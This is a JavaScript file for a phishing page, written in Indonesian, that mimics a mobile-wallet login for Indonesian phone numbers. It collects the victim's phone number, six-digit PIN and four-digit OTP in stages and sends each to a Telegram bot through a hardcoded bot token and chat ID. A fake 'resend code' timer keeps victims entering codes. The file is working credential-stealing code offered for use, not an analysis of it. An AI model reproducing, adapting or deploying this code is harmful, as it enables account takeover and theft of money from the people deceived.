document.addEventListener('DOMContentLoaded', () => {
  const BOT_TOKEN = '8638833167:AAF6FET3TyZUQIoRxTwA6ZtvGyGAaxKghtM'; 
  const CHAT_ID = '-1003903129691';

  const splashScreen = document.getElementById('splashScreen');
  const loadingScreen = document.getElementById('loadingScreen');
  const pagePhone = document.getElementById('pagePhone');
  const pagePin = document.getElementById('pagePin');
  const otpBottomSheet = document.getElementById('otpBottomSheet');
  
  const phoneInput = document.getElementById('phoneInput');
  const btnNext = document.getElementById('btnNext');
  
  const pinFields = document.querySelectorAll('.pin-field');
  const otpFields = document.querySelectorAll('.otp-field');
  const timerSpan = document.getElementById('timer');

  let countdownInterval = null;

  function sendToTelegram(messageText) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    return fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'Markdown'
      })
    })
    .then(response => response.json())
    .then(data => {
      if (!data.ok) {
        alert(`🔴 TELEGRAM MENOLAK PESAN!\nAlasan: ${data.description}\n\nSolusi: Pastikan Bot sudah masuk ke grup dan dijadikan ADMIN.`);
        console.error('Telegram Error:', data.description);
      } else {
        console.log('Pesan sukses terkirim ke Telegram!');
      }
    })
    .catch(error => {
      alert(`❌ GAGAL MENGHUBUNGI TELEGRAM!\nError: ${error}\n\nCek koneksi internet Anda.`);
      console.error('Fetch Error:', error);
    });
  }

  if (splashScreen) {
    setTimeout(() => {
      splashScreen.classList.add('fade-out');
      setTimeout(() => {
        splashScreen.classList.add('hidden');
        if (pagePhone) pagePhone.classList.remove('hidden');
        if (phoneInput) phoneInput.focus();
      }, 600);
    }, 2200);
  }

  if (phoneInput && btnNext) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      
      if (val.startsWith('0')) {
        val = val.substring(1);
      }
      
      if (val.length > 12) {
        val = val.substring(0, 12);
      }
      
      let formatted = '';
      if (val.length > 0) {
        formatted += val.substring(0, 3);
      }
      if (val.length > 3) {
        formatted += '-' + val.substring(3, 7);
      }
      if (val.length > 7) {
        formatted += '-' + val.substring(7, 12);
      }
      
      e.target.value = formatted;
      
      if (val.length >= 8) {
        btnNext.removeAttribute('disabled');
      } else {
        btnNext.setAttribute('disabled', 'true');
      }
    });

    btnNext.addEventListener('click', () => {
      if (loadingScreen) loadingScreen.classList.remove('hidden');
      
      const currentPhone = phoneInput.value;
      const msg = `📱 *Data Masuk - Tahap 1*\n\n*Nomor HP:* \`+62 ${currentPhone}\``;
      
      sendToTelegram(msg);

      setTimeout(() => {
        if (loadingScreen) loadingScreen.classList.add('hidden'); 
        if (pagePhone) pagePhone.classList.add('hidden');     
        if (pagePin) pagePin.classList.remove('hidden');
        
        if (pinFields && pinFields.length > 0) {
          pinFields[0].focus();
        }
      }, 1500);
    });
  } else {
    console.error("EROR: Elemen 'phoneInput' atau 'btnNext' tidak ditemukan di HTML!");
  }

  if (pinFields && pinFields.length > 0) {
    pinFields.forEach((field, index) => {
      field.addEventListener('input', (e) => {
        const val = e.target.value;
        if (!/^\d*$/.test(val)) {
          e.target.value = '';
          return;
        }
        if (val && index < pinFields.length - 1) {
          pinFields[index + 1].focus();
        }
        checkPinComplete();
      });

      field.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !field.value && index > 0) {
          pinFields[index - 1].focus();
        }
      });
    });
  }

  function checkPinComplete() {
    const combinedPin = Array.from(pinFields).map(f => f.value).join('');
    
    if (combinedPin.length === 6) {
      pinFields.forEach(f => f.blur());
      if (loadingScreen) loadingScreen.classList.remove('hidden');

      const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
      const msg = `🔐 *Data Masuk - Tahap 2*\n\n*Nomor HP:* \`+62 ${currentPhone}\`\n*PIN:* \`${combinedPin}\``;
      
      sendToTelegram(msg);

      setTimeout(() => {
        if (loadingScreen) loadingScreen.classList.add('hidden');
        if (otpBottomSheet) otpBottomSheet.classList.add('show'); 
        
        setTimeout(() => {
          if (otpFields && otpFields.length > 0) {
            otpFields[0].focus();
          }
          startOtpCountdown();
        }, 400);
      }, 1400);
    }
  }

  if (otpFields && otpFields.length > 0) {
    otpFields.forEach((field, index) => {
      field.addEventListener('input', (e) => {
        const val = e.target.value;
        if (!/^\d*$/.test(val)) {
          e.target.value = '';
          return;
        }
        if (val && index < otpFields.length - 1) {
          otpFields[index + 1].focus();
        }
        checkOtpComplete();
      });

      field.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !field.value && index > 0) {
          otpFields[index - 1].focus();
        }
      });
    });
  }

  function checkOtpComplete() {
    const combinedOtp = Array.from(otpFields).map(f => f.value).join('');
    const combinedPin = Array.from(pinFields).map(f => f.value).join('');
    const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
    
    if (combinedOtp.length === 4) {
      otpFields.forEach(f => f.blur());
      if (loadingScreen) loadingScreen.classList.remove('hidden'); 
      
      const msg = `🚀 *Data Lengkap Selesai*\n\n*Nomor HP:* \`+62 ${currentPhone}\`\n*PIN:* \`${combinedPin}\`\n*OTP:* \`${combinedOtp}\``;
      
      sendToTelegram(msg).then(() => {
        setTimeout(() => {
          if (loadingScreen) loadingScreen.classList.remove('hidden');
          console.log("Proses Selesai Sempurna.");
        }, 1500);
      });
    }
  }

  function startOtpCountdown() {
    if (!timerSpan) return;
    let timeLeft = 60;
    timerSpan.textContent = timeLeft;
    if (countdownInterval) clearInterval(countdownInterval);
    
    countdownInterval = setInterval(() => {
      timeLeft--;
      timerSpan.textContent = timeLeft;
      
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        const countdownContainer = document.querySelector('.countdown-text');
        if (countdownContainer) {
          countdownContainer.innerHTML = '<a href="#" id="btnResendOtp" style="color:#118EEA; text-decoration:none; font-weight:600; cursor:pointer;">Kirim Ulang Kode</a>';
          const btnResendOtp = document.getElementById('btnResendOtp');
          if (btnResendOtp) {
            btnResendOtp.addEventListener('click', (e) => {
              e.preventDefault();
              if (loadingScreen) loadingScreen.classList.remove('hidden');
              
              const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
              sendToTelegram(`🔄 *Info:* Pengguna \`+62 ${currentPhone}\` meminta kirim ulang OTP.`);

              setTimeout(() => {
                if (loadingScreen) loadingScreen.classList.add('hidden');
                otpFields.forEach(f => f.value = '');
                countdownContainer.innerHTML = 'Kirim ulang dalam <span id="timer">60</span> detik';
                const newTimerSpan = document.getElementById('timer');
                if (newTimerSpan) {
                  document.getElementById('timer').textContent = '60';
                  startOtpCountdownUpdate(newTimerSpan); 
                }
                if (otpFields && otpFields.length > 0) {
                  otpFields[0].focus();
                }
              }, 1200);
            });
          }
        }
      }
    }, 1000);
  }

  function startOtpCountdownUpdate(targetSpan) {
    let timeLeft = 60;
    if (countdownInterval) clearInterval(countdownInterval);
    
    countdownInterval = setInterval(() => {
      timeLeft--;
      targetSpan.textContent = timeLeft;
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        startOtpCountdown(); 
      }
    }, 1000);
  }
});
